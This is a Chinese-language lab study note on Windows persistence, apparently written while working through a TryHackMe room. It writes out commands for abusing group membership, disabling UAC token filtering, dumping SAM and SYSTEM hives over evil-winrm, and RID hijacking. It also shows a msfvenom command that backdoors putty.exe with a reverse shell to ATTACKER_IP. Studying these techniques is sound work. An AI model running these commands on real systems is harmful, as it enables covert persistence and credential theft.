# windos权限维持

## 篡改非特权账户



分配组成员资格

使非特权用户获得管理权限的直接方法是使其成为Administrators组的一部分。我们可以使用以下命令轻松实现此目的：



net localgroup administrators thmuser0 /add

这将允许您使用RDP、 WinRM 或任何其他可用的远程管理服务访问服务器。

如果这看起来太可疑，您可以使用Backup Operators组。该组中的用户没有管理权限，但可以读/写系统上的任何文件或注册表项，而忽略任何已配置的DACL。这将允许我们复制 SAM 和 SYSTEM 注册表配置单元的内容，然后我们可以使用它们来恢复所有用户的密码哈希，使我们能够轻松升级到任何管理帐户。

为此，我们首先将帐户添加到 Backup Operators 组：



net localgroup "Backup Operators" thmuser1 /add



由于这是一个非特权帐户，除非我们将其添加到远程桌面用户( RDP ) 或远程管理用户(WinRM) 组，否则它无法通过RDP或 WinRM 返回计算机。我们将使用 WinRM 来完成这项任务：



C:\> net localgroup "Remote Management Users" thmuser1 /add



我们假设我们已经将凭据转储到服务器上并拥有 thmuser1 的密码。让我们使用其凭据通过 WinRM 进行连接：



如果您现在尝试从您的攻击者机器连接，您会惊讶地发现即使您在 Backups Operators 组中，您也无法按预期访问所有文件。快速检查我们分配的组会表明我们是 Backup Operators 的一部分，但该组已禁用：

evil-winrm -i 10.10.252.5 -u thmuser1 -p Password321

 whoami /groups



这是由于用户帐户控制 ( UAC )。UAC 实现的功能之一 LocalAccountTokenFilterPolicy会在远程登录时剥夺任何本地帐户的管理权限。虽然您可以从图形用户会话通过UAC提升您的权限（在此处阅读有关 UAC 的更多信息），但如果您使用的是 WinRM，您将被限制在没有管理权限的有限访问令牌中。



为了能够从您的用户那里重新获得管理权限，我们必须通过将以下注册表项更改为 1 来禁用 LocalAccountTokenFilterPolicy：



reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1



然后我们继续备份 SAM 和 SYSTEM 文件并将它们下载到我们的攻击者机器上：

*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!



writeup 不一定有文章的就去看看youtube

房间学习的过程中会遇到一些问题，因为房间的时间久远，各种工具或者提供的攻击沙箱的版本慢慢落后了，耐心点上网去查，真实的渗透环境中工具也是需要自己去搭建的，不可能说有集成的kali这些。一个ubuntu就得啥都会，磨练一下自己。学习的过程中有烦躁的情绪是很正常的，要有耐心。

细心很重要，举个例子，想使用secretsdump.py，但是因为看成了smbserver.py在那里搞半天，最后发现是错的。那个心情真的shit了

 no module name 'impacket.examples.utils' 搞吐了，下次谷歌搜索不出来的，直接youtube搜索，节省时间

在学习的过程中，练习环境的搭建不是一个简单的事情，实际渗透的环境也很不一样，









特殊权限和安全描述符

无需修改任何组成员资格即可获得与将用户添加到 Backup Operators 组类似的结果。特殊组之所以特殊，是因为操作系统默认为它们分配了特定的权限。特权只是在系统本身上执行任务的能力。它们包括简单的事情，例如具有关闭服务器的能力，直到非常特权的操作，例如能够取得系统上任何文件的所有权。可在此处找到可用权限的完整列表以供参考。

对于 Backup Operators 组，它默认分配有以下两个权限：

SeBackupPrivilege：用户可以读取系统中的任何文件，忽略任何DACL。
SeRestorePrivilege：用户可以写入系统中的任何文件，忽略任何DACL。
我们可以将此类特权分配给任何用户，而不管他们的组成员身份如何。为此，我们可以使用secedit命令。首先，我们将当前配置导出到一个临时文件：

secedit /export /cfg config.inf

进到config.inf配置文件

更改SeBackupPrivilege 和 SeRestorePrivilege这两行：

SeBackupPrivilege=

SeRestorePrivilege=



我们最终将 .inf 文件转换为 .sdb 文件，然后使用该文件将配置加载回系统：

secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf





RID劫持



另一种无需成为管理员即可获得管理权限的方法是更改某些注册表值，使操作系统认为您是管理员。

创建用户时，会为他们分配一个称为相对 ID (RID)的标识符。RID 只是一个代表整个系统用户的数字标识符。当用户登录时，LSASS 进程从 SAM 注册表配置单元获取其 RID 并创建与该 RID 关联的访问令牌。如果我们可以篡改注册表值，我们可以通过将相同的 RID 关联到两个帐户，让 Windows 将管理员访问令牌分配给非特权用户。

在任何 Windows 系统中，默认的 Administrator 帐户被分配**RID = 500**，而普通用户通常**RID >= 1000**

要查找为任何用户分配的 RID，您可以使用以下命令：

wmic useraccount get name,sid

RID 是 SID 的最后一位（thmuser3 为 1010，Administrator 为 500）。SID 是一个标识符，它允许操作系统跨域识别用户，但对于此任务，我们不会太在意它的其余部分。

现在我们只需将 RID=500 分配给 thmuser3。为此，我们需要使用 Regedit 访问 SAM。SAM 仅限于 SYSTEM 帐户，因此即使是管理员也无法对其进行编辑。要以 SYSTEM 身份运行 Regedit，我们将使用 psexec，它在C:\tools\pstools您的机器中可用：





很多专有名词一定要了解，最好是写在文档里面当作注解，一旦忘记就可以回去复习。





## 后门文件

可执行文件

如果您发现桌面上有任何可执行文件，则用户很可能会经常使用它。假设我们找到了一条通往 PuTTY 的捷径。如果我们检查快捷方式的属性，我们可以看到它（通常）指向C:\Program Files\PuTTY\putty.exe. 从那时起，我们可以将可执行文件下载到攻击者的机器上并修改它以运行我们想要的任何有效载荷。

您可以轻松地在任何带有 .exe 文件中植入您喜欢的有效负载msfvenom。二进制文件仍将像往常一样工作，但通过在二进制文件中添加一个额外的线程来静默执行额外的有效负载。要创建后门的 putty.exe，我们可以使用以下命令：

msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
生成的 puttyX.exe 将在用户不注意的情况下执行 reverse_tcp meterpreter 负载。虽然这种方法足以建立持久性，但让我们看看其他更狡猾的技术。



快捷方式文件

如果我们不想改变可执行文件，我们总是可以篡改快捷方式文件本身。我们可以将其更改为指向将运行后门的脚本，然后正常执行通常的程序，而不是直接指向预期的可执行文件。

对于此任务，让我们检查管理员桌面上的calc快捷方式。如果我们右键单击它并转到属性，我们将看到它指向的位置：



劫持文件关联

除了通过可执行文件或快捷方式持久化之外，我们还可以劫持任何文件关联，以在用户打开特定文件类型时强制操作系统运行 shell。

默认的操作系统文件关联保存在注册表中，其中为HKLM\Software\Classes\. 假设我们要检查哪个程序用于打开 .txt 文件；我们可以去检查子.txt项并找到与之 关联的程序 ID (ProgID) 。ProgID 只是系统上安装的程序的标识符。对于 .txt 文件，我们将具有以下 ProgID：

